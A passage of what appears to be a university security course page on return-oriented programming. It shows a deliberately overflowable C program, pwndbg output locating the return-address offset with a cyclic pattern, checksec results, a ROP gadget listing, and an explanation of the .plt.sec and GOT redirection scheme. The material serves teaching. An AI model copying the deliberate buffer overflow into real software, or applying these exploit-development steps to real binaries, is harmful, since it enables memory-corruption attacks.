f2)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x1c:   0x42 (param2 of f2)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x20:   addr of f3</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="some-useful-tricks">Some Useful Tricks<a class="hash-link" href="#some-useful-tricks" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="memory-spraying">Memory Spraying<a class="hash-link" href="#memory-spraying" title="Direct link to heading">​</a></h3><p>Let&#x27;s take the following program:</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> x</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> y </span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">z</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">b</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">23</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> buf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>It&#x27;s a fairly simple overflow, but just how fast can you figure out the offset to the return address?
How much padding do you need?
There is a shortcut that you can use to figure this out in under 30 seconds without looking at the assembly code.</p><p>A <a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence" target="_blank" rel="noopener noreferrer">De Bruijn sequence</a> is a string of symbols out of a given alphabet in which each consecutive K symbols only appear once in the whole string.
If we can construct such a string out of printable characters then we only need to know the Segmentation Fault address.
Converting it back to 4 bytes and searching for it in the initial string will give us the exact offset to the return address.</p><p><a href="https://github.com/pwndbg/pwndbg" target="_blank" rel="noopener noreferrer">Pwndbg</a> can help you do this, using the <a href="https://docs.pwntools.com/en/stable/util/cyclic.html" target="_blank" rel="noopener noreferrer">cyclic</a> package from the <code>pwnlib</code> library:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pwndbg&gt; cyclic 100  # create a 100-character long De Bruijn sequence</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pwndbg&gt; cyclic -l aaa  # as addresses are 4 or 8  bytes long, you cannot search for a shorter pattern</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[CRITICAL] Subpattern must be 4 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pwndbg&gt; cyclic -l faaa  # the offset of faaa in the above cyclic pattern is 20</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">20</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pwndbg&gt; cyclic 100</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pwndbg&gt; run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Starting program: /media/teo/2TB/Chestii/Poli/SSS/Exploit/sss-exploit/sessions/return-oriented-programming/hello</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x080491d1 in main ()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> EAX  0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> EBX  0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ECX  0x61616172 (&#x27;raaa&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> EDX  0xfbad2288</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> EDI  0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ESI  0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> EBP  0x61616173 (&#x27;saaa&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ESP  0x61616178 (&#x27;uaaa&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> EIP  0x61616174 (&#x27;taaa&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">──────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Invalid address 0x61616174</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[...]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pwndbg&gt; cyclic -l 0x61616174</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">76</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>From the above commands we can deduce that <code>EIP</code>&#x27;s offset relative to the start of
the buffer is 76, as the address that <code>EIP</code> points to is <code>0x61616174</code>, i.e.
<code>&#x27;taaa&#x27;</code>, which lies at offset 76 in the cyclic pattern we&#x27;ve just generated.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="checksec-in-pwndbg">checksec in pwndbg<a class="hash-link" href="#checksec-in-pwndbg" title="Direct link to heading">​</a></h3><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pwndbg&gt; checksec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] &#x27;/media/teo/2TB/Chestii/Poli/SSS/Exploit/sss-exploit/sessions/return-oriented-programming/hello&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Arch:     i386-32-little</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    RELRO:    Partial RELRO</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Stack:    No canary found</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    NX:       NX enabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PIE:      No PIE (0x8048000)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="finding-gadgets-in-pwndbg">Finding Gadgets in <code>pwndbg</code><a class="hash-link" href="#finding-gadgets-in-pwndbg" title="Direct link to heading">​</a></h3><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pwndbg&gt; rop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Gadgets information</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============================================================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x080490fa : adc al, 0x68 ; sbb al, 0xc0 ; add al, 8 ; call eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x08049146 : adc byte ptr [eax + 0x68], dl ; sbb al, 0xc0 ; add al, 8 ; call edx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x08049104 : adc cl, cl ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0804909b : adc dword ptr [eax - 0x2e], -1 ; call dword ptr [eax - 0x73]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0804917c : add al, 8 ; add ecx, ecx ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x080490fe : add al, 8 ; call eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0804914b : add al, 8 ; call edx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0804918c : add byte ptr [eax], al ; add byte ptr [eax], al ; endbr32 ; jmp 0x8049120</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[...]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Unique gadgets found: 121</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pwndbg&gt; rop --grep &quot;pop .* ; pop .* ; ret&quot;  # you can perform a finer search using the --grep parameter and regular expressions</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0804923d : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0804923c : jecxz 0x80491c1 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0804923b : jne 0x8049220 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0804923e : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0804923f : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x08049240 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x08049242 : pop edi ; pop ebp ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x08049241 : pop esi ; pop edi ; pop ebp ; ret</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="further-reading">Further Reading<a class="hash-link" href="#further-reading" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="rop-gadgets-in-pwntools"><code>ROP</code> Gadgets in <code>pwntools</code><a class="hash-link" href="#rop-gadgets-in-pwntools" title="Direct link to heading">​</a></h3><p><code>pwntools</code> has a rather advanced <a href="https://docs.pwntools.com/en/stable/rop/rop.html" target="_blank" rel="noopener noreferrer"><code>ROP</code> module</a> that is capable of crafting <code>ROP</code> attacks corresponding to various functions by creating concatenating chains of <code>ROP</code> addresses, also known as <code>ROP</code> chains.</p><p>For this session, you won&#x27;t need to use this module, but it may come in handy in the future.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="linux-x86-program-start-up">Linux x86 Program Start Up<a class="hash-link" href="#linux-x86-program-start-up" title="Direct link to heading">​</a></h3><p>Notice that the <code>__libc_start_main</code> will always be present in the relocation table.
As you discovered in the session dedicated to <a href="https://github.com/hexcellents/sss-binary/tree/master/sessions/executable-file-formats" target="_blank" rel="noopener noreferrer">executable file formats</a>, this is the function called by the code from the <code>_start</code> label, which, in turn, calls the <code>main()</code> function.</p><p>To find more details about the startup of a Linux x86 program, you can read about it <a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html" target="_blank" rel="noopener noreferrer">here</a>.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-pltsec-schema">The <code>.plt.sec</code> Schema<a class="hash-link" href="#the-pltsec-schema" title="Direct link to heading">​</a></h3><p>Let&#x27;s go back to the small piece of code at the beginning of this lecture:</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Hello world!&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>If we compile it with a more modern (later than 2019) version of even the most &quot;old-school&quot; compilers, such as <code>gcc</code>, we will notice a slight (but actually important) difference in the <code>.plt</code> schema used by the resulting binary file.</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ gcc -m32 -fno-PIC -no-pie hello.c -o hello</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ objdump -M intel -d hello</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[...]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disassembly of section .plt:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">08049030 &lt;.plt&gt;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8049030:       ff 35 04 c0 04 08       push   DWORD PTR ds:0x804c004</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8049036:       ff 25 08 c0 04 08       jmp    DWORD PTR ds:0x804c008</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 804903c:       0f 1f 40 00             nop    DWORD PTR [eax+0x0]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8049040:       f3 0f 1e fb             endbr32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8049044:       68 00 00 00 00          push   0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8049049:       e9 e2 ff ff ff          jmp    8049030 &lt;.plt&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 804904e:       66 90                   xchg   ax,ax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8049050:       f3 0f 1e fb             endbr32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8049054:       68 08 00 00 00          push   0x8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8049059:       e9 d2 ff ff ff          jmp    8049030 &lt;.plt&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 804905e:       66 90                   xchg   ax,ax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disassembly of section .plt.sec:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">08049060 &lt;puts@plt&gt;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8049060:       f3 0f 1e fb             endbr32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8049064:       ff 25 0c c0 04 08       jmp    DWORD PTR ds:0x804c00c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 804906a:       66 0f 1f 44 00 00       nop    WORD PTR [eax+eax*1+0x0]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[...]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now it seems there are two <code>.plt</code> sections: the &quot;classic&quot; <code>.plt</code> and a new <code>.plt.sec</code> section.
Moreover, the entries in the <code>.plt.sec</code> section are very similar to those we&#x27;ve previously shown as being part of <code>.plt</code>.
So why 2 <code>.plt</code>&#x27;s?
And if the initial <code>.plt</code> entries have been moved over to <code>.plt.sec</code>, what is the purpose of the <code>.plt</code> section now?</p><p>First, let&#x27;s check the call to <code>puts()</code> itself:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ objdump -D -j .text -M intel hello | grep puts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 80491b3:   e8 a8 fe ff ff          call   8049060 &lt;puts@plt&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So we see that the function being called now resides in the <code>.plt.sec</code> section.
What about the offset that <code>.plt.sec</code> redirect jumps to (i.e. <code>0x804c00c</code>)?</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ objdump -s -M intel -j .got.plt --start-address=0x0804c00c hello</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hello:     file format elf32-i386</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Contents of section .got.plt:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 804c00c 40900408 50900408                    @...P...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Similarly to what we did previously, we now see that <code>0x804c00c</code> points to
address <code>0x08049040</code>, which is this code inside the <code>.plt</code> section:</p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">8049040:       f3 0f 1e fb             endbr32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">8049044:       68 00 00 00 00          push   0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">8049049:       e9 e2 ff ff ff          jmp    8049030 &lt;.plt&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">804904e:       66 90                   xchg   ax,ax</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So with the <code>.plt.sec</code> schema, there are 2 redirects: one from <code>.plt.sec</code> to <code>.got</code> (or <code>.got.plt</code> to be more precise) and another from <code>.got.plt</code> to <code>.plt</code>.
Notice in the <code>.plt</code> stub above that, like before, <code>0x0</code> is pushed onto the stack before the resolver is called, so that the dynamic linker can change it to the actual address of <code>puts()</code> from libc.</p><p>So why use <code>.plt.sec</code> at all if in the end it looks like it does the same thing?
